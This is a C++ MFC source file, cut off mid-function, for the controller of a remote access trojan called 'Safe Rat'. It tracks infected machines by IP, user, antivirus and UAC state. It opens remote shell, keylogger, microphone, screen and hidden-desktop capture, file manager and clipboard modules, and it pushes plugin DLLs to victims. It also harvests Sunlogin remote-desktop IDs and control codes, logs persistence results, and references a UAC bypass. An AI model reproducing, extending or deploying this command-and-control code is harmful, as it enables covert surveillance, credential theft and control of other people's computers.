

#include "pch.h"
#include "framework.h"
#include "Safe Rat.h"
#include "Safe RatDlg.h"
#include "afxdialogex.h"
#include "Mytypedef.h"

#include "CInputDlg.h"
#include "CEditGropuDlg.h"
#include "CShellDlg.h"
#include "CReg.h"
#include "CSpeakerDlg.h"
#include "CMikeDlg.h"
#include "CServerDlg.h"
#include "CHostDlg.h"
#include "CKeyBoard.h"
#include "CScreenDlg.h"
#include "CFileManagerDlg.h"
#include "CGenerate.h"
#include "CConfig.h"
#include "CHideScreenDlg.h"
#include "PluginsDlg.h"
#include "ClipboardDlg.h"
#include "Sunlogin.h"
#include "C_Akagi64.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


CSafeRatDlg* g_pFrame = NULL;			
CHpTcpServer* m_iocpServer;				
extern std::vector<HTREEITEM> vTemp;	


ListHead ListHead_User[] = {
	{"分组"			,150},
	{"内网"			, 100},
	{"计算机"		,150},
	{"活动窗口"		, 150},
	{"用户"     		, 120},
	{"进程"				,100},
	{"PID"     			, 70},
	{"区域"			    , 120},
	{"防病毒软件"		, 150},
	{"安装时间"			, 120},
	{"延迟"				,  50},
	{{0}}
};



class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();


#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    


protected:
	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	CEdit m_edit;
	CString m_Hwid;
	afx_msg void OnBnClickedButton1();
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
	, m_Hwid(_T(""))
{


}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_edit);
	DDX_Text(pDX, IDC_EDIT1, m_Hwid);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &CAboutDlg::OnBnClickedButton1)
END_MESSAGE_MAP()

void CAboutDlg::OnBnClickedButton1()
{
	UpdateData(TRUE);
	CDialogEx::OnOK();
}

BOOL CAboutDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();


	return TRUE;  
}




CSafeRatDlg::CSafeRatDlg(CWnd* pParent )
	: CXTPDialog(IDD_SAFERAT_DIALOG, pParent)
{

	m_bIsQQwryExist = false;
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	
	g_pFrame = this;
	
	HANDLE	hFile = CreateFileA("QQwry.dat", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		m_bIsQQwryExist = true;
		m_gQQwry.SetPath("QQWry.Dat");
		CloseHandle(hFile);
	}

}

void CSafeRatDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_STATIC_TREELIST, m_OnlineList);
}

BEGIN_MESSAGE_MAP(CSafeRatDlg, CXTPDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_COMMAND(ID_TRAY_SHOW, &CSafeRatDlg::OnTrayShow)
	ON_COMMAND(ID_TRAY_HIDE, &CSafeRatDlg::OnTrayHide)
	ON_COMMAND(ID_TRAY_EXIT, &CSafeRatDlg::OnTrayExit)
	ON_WM_CLOSE()
	ON_MESSAGE(WM_REMOVEFROMLIST, &CSafeRatDlg::OnRemovefromlist)
	ON_MESSAGE(WM_CLOSEDLG, &CSafeRatDlg::OnClosedlg)
	ON_MESSAGE(WM_ADDTOLIST, &CSafeRatDlg::OnAddtolist)
	ON_NOTIFY(NM_RCLICK, IDC_STATIC_TREELIST, &CSafeRatDlg::OnRclickListUser)
	ON_COMMAND(ID_32784, &CSafeRatDlg::OnUnstall)
	ON_COMMAND(ID_32807, &CSafeRatDlg::OnAddGroup)
	ON_COMMAND(ID_32808, &CSafeRatDlg::OnDelGroup)
	ON_COMMAND(ID_32809, &CSafeRatDlg::OnChangeGroup)
	ON_COMMAND(ID_32785, &CSafeRatDlg::OnEditRemark)
	ON_MESSAGE(WM_OPENSHELLDIALOG, &CSafeRatDlg::OnOpenshelldialog)
	ON_COMMAND(ID_32791, &CSafeRatDlg::OnShell)
	ON_COMMAND(ID_32794, &CSafeRatDlg::OnReg)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, &CSafeRatDlg::OnOpenregeditdialog)
	ON_COMMAND(ID_32811, &CSafeRatDlg::OnSpeaker)
	ON_MESSAGE(WM_OPENSPEAKDIALOG, &CSafeRatDlg::OnOpenspeakdialog)
	ON_MESSAGE(WM_OPENMIKEDIALOG, &CSafeRatDlg::OnOpenmikedialog)
	ON_COMMAND(ID_32810, &CSafeRatDlg::OnMike)
	ON_COMMAND(ID_32793, &CSafeRatDlg::OnServer)
	ON_MESSAGE(WM_OPENSERVERDIALOG, &CSafeRatDlg::OnOpenserverdialog)
	ON_MESSAGE(WM_OPENHOSTDIALOG, &CSafeRatDlg::OnOpenhostdialog)
	ON_COMMAND(ID_32795, &CSafeRatDlg::OnHost)
	ON_COMMAND(ID_32792, &CSafeRatDlg::OnKeyboard)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, &CSafeRatDlg::OnOpenkeyboarddialog)
	ON_COMMAND(ID_32803, &CSafeRatDlg::OnShutdown)
	ON_COMMAND(ID_32804, &CSafeRatDlg::OnReboot)
	ON_COMMAND(ID_32805, &CSafeRatDlg::OnLogoff)
	ON_COMMAND(ID_32790, &CSafeRatDlg::OnScreen)
	ON_MESSAGE(WM_OPENSCREENDIALOG, &CSafeRatDlg::OnOpenscreendialog)
	ON_COMMAND(ID_32789, &CSafeRatDlg::OnFile)
	ON_MESSAGE(WM_OPENFILEDIALOG, &CSafeRatDlg::OnOpenfiledialog)
	ON_COMMAND(ID_32872, &CSafeRatDlg::OnGenerate)
	ON_COMMAND(ID_32871, &CSafeRatDlg::OnConfig)
	ON_COMMAND(ID_32874, &CSafeRatDlg::OnHideScreen)
	ON_MESSAGE(WM_OPENHIDESCREENDIALOG, &CSafeRatDlg::OnOpenhidescreendialog)
	ON_COMMAND(ID_32875, &CSafeRatDlg::OnMovOnline)
	ON_COMMAND(ID_32916, &CSafeRatDlg::On32916)
	ON_MESSAGE(WM_OPENPLUGINSDIALOG, &CSafeRatDlg::OnOpenpluginsdialog)
	ON_COMMAND(ID_32918, &CSafeRatDlg::On32918)
	ON_MESSAGE(WM_OPENCLIPDIALOG, &CSafeRatDlg::OnOpenclipdialog)
	ON_COMMAND(ID_32919, &CSafeRatDlg::On32919)
	ON_COMMAND(ID_32920, &CSafeRatDlg::On32920)
	ON_COMMAND(ID_32921, &CSafeRatDlg::On32921)
	ON_COMMAND(ID_32922, &CSafeRatDlg::On32922)
END_MESSAGE_MAP()



//初始化
BOOL CSafeRatDlg::OnInitDialog()
{

	CXTPDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			
	SetIcon(m_hIcon, FALSE);		

	
	this->CenterWindow(CWnd::GetDesktopWindow());

	
	int cx = m_IniFile.GetInt("Safe", "Width", 1185+150);
	int cy = m_IniFile.GetInt("Safe", "Hight", 600);
	this->MoveWindow(0, 0, cx, cy);

	if (!InitView()) return -1;

	
	int	nListenPort = m_IniFile.GetInt("safe", "port", 8000);

	
	Activate(nListenPort);
	
	return TRUE;  
}



//回调 上线和
void CALLBACK CSafeRatDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	if (m_iocpServer->m_bIsOver) return;

	try
	{
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:		//关闭
		{

			if (pContext->m_bIsMainSocket) g_pFrame->OnRemovefromlist(NULL, (LPARAM)pContext);
			else g_pFrame->PostMessage(WM_CLOSEDLG, (WPARAM)pContext->m_Dialog[0], (LPARAM)pContext->m_Dialog[1]);
		}
		break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			break;
		case NC_RECEIVE_COMPLETE:		//接收消息
			ProcessReceiveComplete(pContext);
			break;
		}
	}
	catch (...) {}
}


//接收消息
void CSafeRatDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SHELL_DLG:
			((CShellDlg*)dlg)->OnReceiveComplete();
			break;
		case REG_DLG:
			((CReg*)dlg)->OnReceiveComplete();
		case SPEAKER_DLG:
			((CSpeakerDlg*)dlg)->OnReceiveComplete();
			break;
		case MIKE_DLG:
			((CMikeDlg*)dlg)->OnReceiveComplete();
		case SERVER_DLG:
			((CServerDlg*)dlg)->OnReceiveComplete();
			break;	
		case HOST_DLG:
			((CHostDlg*)dlg)->OnReceiveComplete();
			break;	
		case KEYBOARD_DLG:
			((CKeyBoard*)dlg)->OnReceiveComplete();
			break;
		case SCREEN_DLG:
			((CScreenDlg*)dlg)->OnReceiveComplete();
			break;
		case FILE_DLG:
			((CFileManagerDlg*)dlg)->OnReceiveComplete();
			break;
		case HIDE_DLG:
			((CHideScreenDlg*)dlg)->OnReceiveComplete();
			break;
		case PLUG_DLG:
			((CPluginsDlg*)dlg)->OnReceiveComplete();
			break;
		case CLIP_DLG:
			((CClipboardDlg*)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}


	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_LOGIN:			//登录
	{
		pContext->m_bIsMainSocket = TRUE;
		g_pFrame->OnAddtolist(0, (LPARAM)pContext); 
		break;
	}
	case TOKEN_BUSY_PC:		
	{
		if (pContext->m_dwLineRGB != 0)
		{
			pContext->m_dwLineRGB = 0;
			g_pFrame->m_OnlineList.UpdataColor();   
		}
		break;
	}
	case TOKEN_IDLE_PC:	 
	{
		if (pContext->m_dwLineRGB != RGB(255, 0, 0))
		{
			pContext->m_dwLineRGB = RGB(255, 0, 0);
			g_pFrame->m_OnlineList.UpdataColor();   
		}
		break;
	}
	case TOKEN_ACTIVE_WINDOWS:
		{
			char* title = (char*)pContext->m_DeCompressionBuffer.GetBuffer(1);
			g_pFrame->m_OnlineList.SetItemText(pContext->m_hItem, 3,title);	
			break;
		}
	case TOKEN_SHELL_START: 
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:		
		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SPEAK_START: 
		g_pFrame->PostMessage(WM_OPENSPEAKDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: 
		g_pFrame->PostMessage(WM_OPENMIKEDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SERVER_START: 
		g_pFrame->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_HOST_START:       
		g_pFrame->PostMessage(WM_OPENHOSTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:   
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO:    
		g_pFrame->PostMessage(WM_OPENSCREENDIALOG, 0, (LPARAM)pContext);	
		break;
	case TOKEN_DRIVE_LIST:    
		g_pFrame->PostMessage(WM_OPENFILEDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_BITMAPINFO_HIDE:
		g_pFrame->PostMessage(WM_OPENHIDESCREENDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_ACTIVE_PLUGINS: 
		g_pFrame->PostMessage(WM_OPENPLUGINSDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CLIP_START:
		g_pFrame->PostMessage(WM_OPENCLIPDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_LIST_REMOTE:
		{
			int result = ::MessageBox(nullptr, TEXT("获取id密码到日志"), TEXT("温馨提示:"), MB_ICONINFORMATION | MB_YESNO);
			switch (result)
			{
			case IDYES:
				{
					SunloginID SunloginIDmima;
					LPBYTE lpBuffer = (LPBYTE)(pContext->m_DeCompressionBuffer.GetBuffer(1));
					memcpy(&SunloginIDmima, lpBuffer, sizeof(SunloginID));
					CString ID;
					ID.Format("向日葵 电脑ID:%s   控制码:%s", SunloginIDmima.ID, SunloginIDmima.mima);
					g_pFrame->m_log.AddToLog(ID);
				}
				break;
			}
		}
	case TOKEN_RUN_SUCCESS:g_pFrame->m_log.AddToLog("自启动添加成功"); break;
	case TOKEN_RUN_ERROR:g_pFrame->m_log.AddToLog("自启动添加失败"); break;
	default:
		break;
	}
}


// 激活服务器
void CSafeRatDlg::Activate(int nPort)
{
	if (m_iocpServer != NULL)
	{
		delete m_iocpServer;
		m_iocpServer = NULL;
	}

	DWORD max  = m_IniFile.GetInt("safe", "max", 3000);

	CString str;
	str.Format("端口: %d", nPort);
	m_iocpServer = new CHpTcpServer;
	if (!m_iocpServer->Initialize(NotifyProc, this, max, nPort,0))
	{
		str += " 失败";
		AfxMessageBox(str);
	}
	m_wndStatusBar.SetPaneText(1, str);

	m_log.AddToLog(str);


}

BOOL CSafeRatDlg::InitView()
{
	
	if (!m_wndStatusBar.Create(this) || !m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT)))return FALSE;


	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_NORMAL,200);   
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL,80);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_STRETCH,NULL);  
	
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);	
	
	m_wndStatusBar.SetPaneText(0, Getloadip(0));
	m_wndStatusBar.SetPaneText(1, "端口: 0");

	
	CXTPPaintManager::SetTheme(xtpThemeOffice2003);

	
	VERIFY(m_paneManager.InstallDockingPanes(this));
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2003);
	m_paneManager.UseSplitterTracker(FALSE);
	m_paneManager.SetShowContentsWhileDragging(TRUE);
	m_paneManager.SetAlphaDockingContext(TRUE);
	DWORD dwOption = xtpPaneNoCloseable;						
	DWORD dwOptions = m_paneManager.GetDefaultPaneOptions();
	m_paneManager.SetDefaultPaneOptions(dwOptions & dwOption ? dwOptions & ~dwOption : dwOptions | dwOption);
	m_paneManager.RecalcFramesLayout();
	CXTPDockingPane* pwndPane1 = m_paneManager.CreatePane(IDR_PANE_LOG, CRect(0, 0, 0, 150), xtpPaneDockBottom);
	
	
	LOGFONT lfIcon;
	VERIFY(::SystemParametersInfo(SPI_GETICONTITLELOGFONT, sizeof(lfIcon), &lfIcon, 0));
	m_fntEdit.CreateFontIndirect(&lfIcon);
	OnDockingPaneNotify(XTP_DPN_SHOWWINDOW, (LPARAM)pwndPane1);

	m_Count = 0;
	
	if (!m_TrayIcon.Create(_T("连接: 0\r\n"), 
		this,                       
		IDR_MAINFRAME,              
		IDR_MENU_TRAY,              
		ID_TRAY_SHOW,           
		false))                     
	{
		return -1;
	}

	
	tree_ImageLogList.Create(16, 16, ILC_COLOR32 | ILC_MASK, 10, 0);
	tree_ImageLogList.Add(AfxGetApp()->LoadIcon(IDI_ICON_MAIN));
	tree_ImageLogList.Add(AfxGetApp()->LoadIcon(IDI_ICON_ITEM));
	m_OnlineList.GetTreeCtrl().SetImageList(&tree_ImageLogList, TVSIL_NORMAL);
	
	UINT uTreeStyle = TVS_FULLROWSELECT | TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT | TVS_CHECKBOXES;
	m_OnlineList.GetTreeCtrl().ModifyStyle(0, uTreeStyle);
	m_OnlineList.GetTreeCtrl().ModifyStyle(TVS_DISABLEDRAGDROP, 0);
	m_OnlineList.AddGroup("默认分组");

	CString str;

	
	for(int i = 0; lstrlen(ListHead_User[i].szTitle) > 0; i++)
		m_OnlineList.InsertColumn(i, ListHead_User[i].szTitle, 0, ListHead_User[i].nWeight);
	return TRUE;
}

afx_msg LRESULT CSafeRatDlg::OnClosedlg(WPARAM wParam, LPARAM lParam)
{
	ULONG_PTR m_Dialog[2];
	m_Dialog[0] = (ULONG_PTR)wParam;
	m_Dialog[1] = (ULONG_PTR)lParam;
	
	switch (m_Dialog[0])
	{
		case SHELL_DLG:
		case REG_DLG:
		case SPEAKER_DLG:
		case MIKE_DLG:
		case SERVER_DLG:
		case HOST_DLG:
		case KEYBOARD_DLG:
		case SCREEN_DLG:
		case FILE_DLG:
		case HIDE_DLG:
		case PLUG_DLG:
		case CLIP_DLG:
			((CDialog*)m_Dialog[1])->DestroyWindow();
			break;
		default:
			break;
	}
	return 0;
}

#include<ws2tcpip.h>
CString CSafeRatDlg::Getloadip(int ipv6)
{
	
	struct addrinfo         * ailist, * aip;
	struct addrinfo         hint = {0};
	char                    hostname[255] = { 0 };           
	char                    buffer[INET6_ADDRSTRLEN];

	hint.ai_family = AF_INET ; 
	hint.ai_socktype = SOCK_STREAM;           


	if (getaddrinfo(hostname, 0, &hint, &ailist)!=0)
	{

		return "获取失败";
	}

	for (aip = ailist; aip != NULL; aip = aip->ai_next)                             
	{
		struct sockaddr_in* sinp;
		sinp = (struct sockaddr_in*)aip->ai_addr;
		const char* ipString = inet_ntop(AF_INET, &sinp->sin_addr, buffer, sizeof(buffer));
	}

	freeaddrinfo(ailist);

	return buffer;
}

LRESULT CSafeRatDlg::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			if (pPane->GetID() == IDR_PANE_LOG)
			{
				
				if (!::IsWindow(m_log.m_hWnd))
				{
					if (!m_log.CreateEx(WS_EX_STATICEDGE, NULL, _T(""),
						WS_CHILD | ES_AUTOVSCROLL | ES_MULTILINE, CRect(0, 0, 200, 120), this, 0))
					{
						TRACE0("Error creating pane edit control.\n");
					}
					m_log.SetFont(&m_fntEdit);
				}
				pPane->Attach(&m_log);
			}

		}
		return TRUE; 
	}
	return FALSE;
}

void CSafeRatDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CXTPDialog::OnSysCommand(nID, lParam);
	}
}



void CSafeRatDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); 

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) ;
		int y = (rect.Height() - cyIcon + 1) ;

		
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CXTPDialog::OnPaint();
	}
}


HCURSOR CSafeRatDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CSafeRatDlg::OnSize(UINT nType, int cx, int cy)
{
	CXTPDialog::OnSize(nType, cx, cy);

	
	if (!IsWindowVisible())
		return;

	if (nType == SIZE_MINIMIZED)
	{
		
		ShowWindow(SW_HIDE);
		m_TrayIcon.ShowBalloonTip(_T("程序运行中,以最小化"), _T(""), NIIF_NONE, 10);
	}

	
	CRect rcClient(0, 0, cx, cy);
	RepositionBars(0, 0xffff, AFX_IDW_PANE_FIRST, 0, 0, &rcClient);
	RepositionBars(0, 0xffff, AFX_IDW_PANE_FIRST, reposQuery, &rcClient, &rcClient);
	m_OnlineList.MoveWindow(rcClient);

	
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); 

	RECT	rect;
	m_wndStatusBar.GetItemRect(2, &rect);

}

void CSafeRatDlg::OnTrayShow()
{
	
	if (!::IsWindowVisible(m_hWnd)) {
		ShowWindow(SW_NORMAL);
	}
	else
		ShowWindow(SW_HIDE);
}

void CSafeRatDlg::OnTrayHide()
{
	ShowWindow(SW_HIDE);
}

void CSafeRatDlg::OnTrayExit()
{
	PostMessage(WM_CLOSE,0,0);
}

void CSafeRatDlg::OnClose()
{

	if (MessageBoxA("确定不是误碰吗","退出提醒",MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	CXTPDialog::OnClose();

	if (m_iocpServer)
		delete m_iocpServer;

	exit(0);
}

void CSafeRatDlg::ShowToolTips(LPCTSTR lpszText)
{
	m_TrayIcon.ShowBalloonTip(lpszText, _T("新信息: "), NIIF_INFO, 10);
}

afx_msg LRESULT CSafeRatDlg::OnRemovefromlist(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL) return -1;

	if (pContext->m_hItem == NULL) return -1;

	
	CString str;
	str.Format("下线 %s (%s)", m_OnlineList.GetItemText(pContext->m_hItem, 0), m_OnlineList.GetItemText(pContext->m_hItem, 2));
	m_log.AddToLog(str);

	m_OnlineList.GetTreeCtrl().DeleteItem(pContext->m_hItem);
	m_OnlineList.UpDateNumber();

	
	str.Format("连接: %d",--m_Count);
	m_TrayIcon.SetTooltipText(str);

	return 0;
}

afx_msg LRESULT CSafeRatDlg::OnAddtolist(WPARAM wParam, LPARAM lParam)
{

	CString strText;

	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL) return -1;

	
	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	if ((pContext->m_DeCompressionBuffer.GetBufferLen()) !=  sizeof(LOGININFO)  )
	{
		m_iocpServer->Disconnect(pContext);
		return -1;
	}
	
	
	HTREEITEM hItem = m_OnlineList.InsertItem(pContext->m_RemoteIP, 0, LoginInfo->szGroup);

	
	m_OnlineList.SetItemData(hItem, (ULONG_PTR)pContext);

	m_OnlineList.SetItemText(hItem, 1, LoginInfo->loadlip);
	
	
	m_OnlineList.SetItemText(hItem, 2, LoginInfo->HostName);

	
	if (LoginInfo->bUAC) strText.Format("%s*", LoginInfo->userName);
	else strText.Format("%s", LoginInfo->userName);
	m_OnlineList.SetItemText(hItem, 4, strText);

	
	strText = LoginInfo->ProName;
	int index = strText.ReverseFind('\\');
	if (index != -1)
	{
		strText = strText.Right(strText.GetLength()- index-1);
		m_OnlineList.SetItemText(hItem, 5, strText);
	}


	strText.Format("%d", LoginInfo->pid);
	m_OnlineList.SetItemText(hItem, 6, strText);

	
	if (m_bIsQQwryExist)
	{
		strText = m_gQQwry.IPtoAdd(pContext->m_RemoteIP);
		m_OnlineList.SetItemText(hItem, 7, strText);
	}
	else m_OnlineList.SetItemText(hItem, 7, "无纯真数据库");

	
	m_OnlineList.SetItemText(hItem, 8, LoginInfo->szAntiVirus);

	
	m_OnlineList.SetItemText(hItem,9,LoginInfo->szInsTime);

	
	char szPing[128] = { 0 };
	wsprintf(szPing, "%d", LoginInfo->dwSpeed);
	m_OnlineList.SetItemText(hItem, 10, szPing);
	
	
	strText.Format("上线 %s (%s) ", pContext->m_RemoteIP, LoginInfo->HostName);
	m_log.AddToLog(strText);

	
	ShowToolTips(strText);

	
	strText.Format("连接: %d",++m_Count);
	m_TrayIcon.SetTooltipText(strText);

	return 0;
}

CString CSafeRatDlg::GetExePath(void)
{
	CString strExePath;
	GetModuleFileName(NULL, strExePath.GetBuffer(MAX_PATH), MAX_PATH);
	strExePath.ReleaseBuffer();
	strExePath = strExePath.Left(strExePath.ReverseFind(_T('\\')));
	return strExePath;
}

afx_msg void CSafeRatDlg::OnRclickListUser(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	*pResult = 0;

	CPoint p;
	GetCursorPos(&p);

	CMenu menu;
	VERIFY(menu.LoadMenu(IDR_MENU_TREE));
	CMenu* pPopup = menu.GetSubMenu(0);
	ASSERT(pPopup != NULL);
	
	CWnd* pWndPopupOwner = this;
	while (pWndPopupOwner->GetStyle() & WS_CHILD)
		pWndPopupOwner = pWndPopupOwner->GetParent();


	CXTPCommandBars::TrackPopupMenu(pPopup, TPM_RIGHTBUTTON, p.x, p.y, AfxGetMainWnd(), 0, pWndPopupOwner);
}

void CSafeRatDlg::OnUnstall()
{
	
	if (MessageBox(_T("确认卸载"), _T("提示"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_UNINSTALL;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CSafeRatDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{
	
	if (m_OnlineList.GetSelectedCount() < 1)
	{
		return;
	}

	
	HTREEITEM hSelectedItem = m_OnlineList.GetTreeCtrl().GetFirstSelectedItem();
	while (hSelectedItem) {

		ClientContext* pContext = (ClientContext*)m_OnlineList.GetTreeCtrl().GetItemData(hSelectedItem);
		
		if (pContext)
		{
			m_iocpServer->Send(pContext, pData, nSize);
		}
		
		hSelectedItem = m_OnlineList.GetTreeCtrl().GetNextSelectedItem(hSelectedItem);
	}
}


void CSafeRatDlg::SendBaseDll(BYTE bToken, char* pFileName)
{

	
	CString strCurPath = GetExePath() + "\\Plugins\\基础插件\\" + pFileName;

	HANDLE			hfile;
	DWORD			filesize;
	
	hfile = CreateFileA(strCurPath.GetBuffer(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		m_log.AddToLog("插件文件未找到，打开失败");
		return;
	}

	
	filesize = GetFileSize(hfile, 0);
	
	char* filebuff = (char*)malloc(filesize+1 );
	filebuff[0] = bToken;

	
	DWORD lpNumberOfBytesRead;
	ReadFile(hfile, filebuff+1, filesize,&lpNumberOfBytesRead,0);

	SendSelectCommand((PBYTE)filebuff,filesize + 1);
	free(filebuff);

	CloseHandle(hfile);
}


void CSafeRatDlg::OnAddGroup()
{
	CInputDlg dlg;
	CString strGroup, strGroupName, strTemp;
	dlg.Init("添加新分组", "请输入新分组的名称");
	if (dlg.DoModal() != IDOK || dlg.m_putdata.GetLength() == 0)
		return;
	m_OnlineList.AddGroup(dlg.m_putdata.GetBuffer());
}

void CSafeRatDlg::OnDelGroup()
{
	
	HTREEITEM hSelectedItem = m_OnlineList.GetTreeCtrl().GetFirstSelectedItem();
	if (hSelectedItem == NULL) 	return;

	DWORD_PTR dw = m_OnlineList.GetTreeCtrl().GetItemData(hSelectedItem);
	if (dw != 0) return;

	m_OnlineList.DelGroup(hSelectedItem);
}

void CSafeRatDlg::OnChangeGroup()
{
	
	if (m_OnlineList.GetSelectedCount() < 1) return;

	
	CEditGropuDlg m_group;

	if (m_group.DoModal() == IDOK)
	{
		
		int	nPacketLength = m_group.m_NewGroup.GetLength()+ 2;
		BYTE	lpPacket[1024] = { 0 };
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.m_NewGroup.GetBuffer(0), nPacketLength - 1);
		
		vTemp.clear();

		HTREEITEM hSelectedItem = m_OnlineList.GetTreeCtrl().GetFirstSelectedItem();
		while (hSelectedItem) {

			ClientContext* pContext = (ClientContext*)m_OnlineList.GetTreeCtrl().GetItemData(hSelectedItem);
			
			if (pContext)
			{
				vTemp.push_back(pContext->m_hItem);
				m_iocpServer->Send(pContext, lpPacket, nPacketLength);
			}

			hSelectedItem = m_OnlineList.GetTreeCtrl().GetNextSelectedItem(hSelectedItem);
		}

		HTREEITEM hItemDrop = m_OnlineList.FindGroup(m_group.m_NewGroup.GetBuffer());

		if (hItemDrop != NULL)
		{
			for (std::vector<HTREEITEM>::const_iterator it = vTemp.begin(); it < vTemp.end(); ++it)
			{
				m_OnlineList.GetTreeCtrl().MoveTreeItem(*it, hItemDrop);
			}
		}
		m_OnlineList.UpDateNumber();
	
	}
}

void CSafeRatDlg::OnEditRemark()
{
	int nSelected = m_OnlineList.GetSelectedCount();

	
	if (nSelected < 1)
		return;

	CString strTitle;
	if (nSelected == 1)
		strTitle.Format(_T("更改主机(%s)的备注"), m_OnlineList.GetItemText(m_OnlineList.GetTreeCtrl().GetFirstSelectedItem(), 3));
	else
		strTitle.Format("已选择(%d)台主机 批量更改主机备注", nSelected);
	CInputDlg	dlg(this);
	dlg.Init(strTitle, _T("请输入新的备注:"));
	if (dlg.DoModal() != IDOK || dlg.m_putdata.GetLength() == 0)
		return;

	int		nPacketLength = dlg.m_putdata.GetLength() + 2;

	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_putdata.GetBuffer(0), nPacketLength - 1);

	HTREEITEM hSelectedItem = m_OnlineList.GetTreeCtrl().GetFirstSelectedItem();
	while (hSelectedItem) {
		ClientContext* pContext = (ClientContext*)m_OnlineList.GetTreeCtrl().GetItemData(hSelectedItem);
		if (pContext)
		{
			m_OnlineList.SetItemText(hSelectedItem, 3, dlg.m_putdata);
			m_iocpServer->Send(pContext, lpPacket, nPacketLength);
		}
		hSelectedItem = m_OnlineList.GetTreeCtrl().GetNextSelectedItem(hSelectedItem);
	}
	delete[] lpPacket;
}

afx_msg LRESULT CSafeRatDlg::OnOpenshelldialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
